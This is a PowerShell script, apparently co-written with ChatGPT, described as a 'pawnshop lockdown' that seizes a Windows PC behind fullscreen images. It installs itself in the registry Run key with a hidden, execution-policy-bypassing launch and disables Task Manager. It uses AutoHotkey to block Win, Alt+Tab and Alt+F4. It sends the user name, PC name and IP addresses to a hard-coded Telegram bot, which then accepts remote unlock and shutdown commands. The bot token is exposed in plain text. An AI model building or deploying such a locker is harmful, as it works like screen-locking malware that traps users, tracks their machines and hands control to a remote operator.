# =======================
# Pawnshop Lockdown Script v2.2 (REWORKED)
# -----------------------
# New method to block WIN key and combinations + Reliable Telegram Listener
# Author: Codrut + ChatGPT
# =======================

# --- CONFIGURATION ---
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\lockscreen.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$lockFile = "C:\\lock_status.txt"
$unlockCommand = "/unlock$user"
$lockCommand = "/lock$user"
$shutdownCommand = "/shutdown$user"
$script:AllowClose = $false

# --- STATE CHECK ---
if (Test-Path $lockFile) {
    $state = Get-Content $lockFile -ErrorAction SilentlyContinue
    if ($state -eq "unlocked") { return }
} else {
    "locked" | Out-File $lockFile -Force
}

# --- AUTOSTART ---
$RunKey = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$RunValueName = "PawnShopLock"
if ($MyInvocation.MyCommand.Path) {
    $startCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Force
}

# --- DISABLE TASK MANAGER ---
New-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Force | Out-Null
Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -Force

# --- DOWNLOAD IMAGE ---
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# --- TELEGRAM INITIAL NOTIFICATION ---
try {
    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169' })[0].IPAddress
} catch { $ipLocal = "n/a" }
try { $ipPublic = Invoke-RestMethod "https://api.ipify.org" } catch { $ipPublic = "n/a" }
$message = "🔒 Pawnshop PC Locked:`nUser: $user`nPC: $pc`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nCommands:`n$unlockCommand`n$lockCommand`n$shutdownCommand"
Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body (@{ chat_id = $chatID; text = $message } | ConvertTo-Json -Depth 3) -ContentType 'application/json'

# --- KEYBLOCK SCRIPT (Better with AutoHotKey) ---
$ahkScript = @'
#NoTrayIcon
#Persistent
SetBatchLines, -1

; Disable WIN, ALT+TAB, ALT+F4, WIN+TAB
LWin::Return
RWin::Return
!Tab::Return
#Tab::Return
!F4::Return

; Optional: Escape override
^Esc::Return

; Manual override with "C"
c::ExitApp
'@

$ahkPath = "$env:TEMP\keyblock.ahk"
Set-Content -Path $ahkPath -Value $ahkScript
Start-Process -FilePath "AutoHotkey.exe" -ArgumentList $ahkPath

# --- FULLSCREEN IMAGE DISPLAY ---
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; TopMost = $true;
        Bounds = $screen.Bounds; KeyPreview = $true; ShowInTaskbar = $false; Cursor = [Windows.Forms.Cursors]::None
    }
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
    $pb = New-Object Windows.Forms.PictureBox -Property @{ Image = [System.Drawing.Image]::FromFile($tempImagePath); Dock = 'Fill'; SizeMode = 'Zoom' }
    $form.Controls.Add($pb); $form.Show(); $form
}

# --- TELEGRAM LISTENER ---
$offset = 0
try {
    $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
    if ($init.result.Count -gt 0) { $offset = ($init.result | Select-Object -Last 1).update_id + 1 }
} catch {}

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 3000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            $txt = $u.message.text
            if ($null -eq $txt) { continue }
            $txt = $txt.ToLower()

            if ($txt -eq $unlockCommand.ToLower()) {
                "unlocked" | Out-File $lockFile -Force
                Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 0 -Force
                $script:AllowClose = $true
                [System.Windows.Forms.Application]::Exit()
            } elseif ($txt -eq $lockCommand.ToLower()) {
                "locked" | Out-File $lockFile -Force
                Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Force
            } elseif ($txt -eq $shutdownCommand.ToLower()) {
                Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                Stop-Computer -Force
            }
        }
    } catch {}
})
$timer.Start()

# --- MAIN LOOP ---
[System.Windows.Forms.Application]::Run()

# --- CLEANUP ---
$timer.Stop()
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 0 -Force
